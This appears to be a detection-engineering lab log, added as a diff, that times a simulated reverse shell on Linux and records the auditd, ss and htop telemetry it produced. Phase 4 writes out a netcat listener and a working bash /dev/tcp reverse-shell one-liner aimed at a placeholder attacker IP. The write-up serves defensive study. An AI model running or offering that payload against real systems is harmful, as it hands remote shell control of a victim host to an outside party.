@@ -1,0 +1,205 @@
+# Reverse Shell Execution Timeline
+# Technique: T1059 — Command and Scripting Interpreter
+# Simulation Date: Tue May 26 2026
+
+====================================================================
+[ PHASE 1 — AUDITD INITIALIZATION ]
+====================================================================
+
+19:55:24
+- auditd service verified and confirmed active
+
+19:56:56
+- existing audit rules cleared using:
+  sudo auditctl -D
+
+19:56:10
+- execve monitoring rules loaded:
+  sudo auditctl -a always,exit -F arch=b64 -S execve -k exec_monitor
+
+19:56:17
+- audit rules validated using:
+  sudo auditctl -l
+
+Objective:
+- establish syscall-level process execution telemetry
+- validate auditd visibility before attack simulation
+
+====================================================================
+[ PHASE 2 — TELEMETRY VALIDATION ]
+====================================================================
+
+19:57:07
+- baseline command executions initiated:
+  /bin/bash
+  whoami
+  hostname
+
+19:58:14
+- interactive bash shell execution captured by auditd
+
+Relevant telemetry:
+  type=EXECVE
+  a0="bash"
+  a1="-i"
+
+Relevant process metadata:
+  ppid=4833
+  pid=4843
+  exe="/usr/bin/bash"
+
+Observations:
+- interactive shell execution confirmed
+- parent-child lineage visibility validated
+- execve telemetry functioning correctly
+
+====================================================================
+[ PHASE 3 — COMMAND EXECUTION OBSERVATION ]
+====================================================================
+
+19:58:35
+- whoami command executed from interactive shell context
+
+Relevant telemetry:
+  type=EXECVE
+  a0="whoami"
+
+Relevant process metadata:
+  ppid=4843
+  pid=4858
+  comm="whoami"
+
+Observations:
+- command execution lineage correlated to bash PID 4843
+- auditd successfully captured transient process execution
+
+------------------------------------------------------------
+
+19:58:41
+- hostname command executed from interactive shell context
+
+Relevant telemetry:
+  type=EXECVE
+  a0="hostname"
+
+Relevant process metadata:
+  ppid=4843
+  pid=4861
+  comm="hostname"
+
+Observations:
+- additional child process execution confirmed
+- process ancestry reconstruction successful
+
+====================================================================
+[ PHASE 4 — REVERSE SHELL ESTABLISHMENT ]
+====================================================================
+
+20:00:12
+- netcat listener initialized on attacker system:
+  nc -lvnp 4444
+
+20:00:21
+- reverse shell payload executed on victim:
+  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+Observations:
+- outbound TCP callback established successfully
+- interactive remote shell session confirmed
+- reverse shell communication channel operational
+
+====================================================================
+[ PHASE 5 — NETWORK TELEMETRY COLLECTION ]
+====================================================================
+
+20:00:40
+- active TCP connection monitoring performed using:
+  sudo ss -plant
+
+Observed indicators:
+- ESTAB TCP session
+- remote callback to attacker IP
+- bash-associated network activity
+
+Detection relevance:
+- shell process associated with outbound connection
+- potential reverse shell behavioral pattern identified
+
+====================================================================
+[ PHASE 6 — PROCESS LINEAGE OBSERVATION ]
+====================================================================
+
+20:01:30
+- live process monitoring performed using:
+  htop
+
+Observations:
+- pstree monitoring proved inefficient due to:
+    - deep process tree output
+    - rapid child process termination
+    - limited viewport visibility
+
+- htop selected as alternative monitoring mechanism
+
+20:01:37
+- sleep command executed intentionally to extend process lifetime:
+  sleep 5
+
+Observations:
+- child process successfully observed under interactive shell context
+- reverse shell lineage visually validated through htop
+- transient commands such as whoami terminated too quickly for reliable visual capture
+
+Detection engineering note:
+- auditd execve telemetry treated as authoritative execution source
+- visual observation used only for supplemental validation
+
+====================================================================
+[ PHASE 7 — POST-SIMULATION TELEMETRY REVIEW ]
+====================================================================
+
+20:02:02
+- audit telemetry reviewed using:
+  sudo ausearch -k exec_monitor
+
+Telemetry types observed:
+- SYSCALL
+- EXECVE
+- CWD
+- PATH
+- PROCTITLE
+
+Relevant observables captured:
+- executable paths
+- parent-child PID relationships
+- interactive shell invocation
+- transient command execution
+- current working directory
+- session and TTY information
+
+====================================================================
+[ FINAL ASSESSMENT ]
+====================================================================
+
+Simulation Objectives Achieved:
+[+] execve telemetry operational
+[+] reverse shell execution successful
+[+] outbound callback activity observed
+[+] command execution lineage reconstructed
+[+] transient child processes captured through auditd
+[+] shell-associated network activity validated
+[+] investigation-grade evidence artifacts collected
+
+Key Detection Opportunities:
+- interactive shell execution
+- shell-to-network correlation
+- outbound TCP activity from shell interpreters
+- suspicious child command execution
+- discovery command patterns
+- bash interactive mode execution
+
+Known Telemetry Limitations:
+- short-lived processes difficult to observe visually
+- pstree unsuitable for fast transient process monitoring
+- manual observation less reliable than audit telemetry
+- network-to-process correlation partially manual
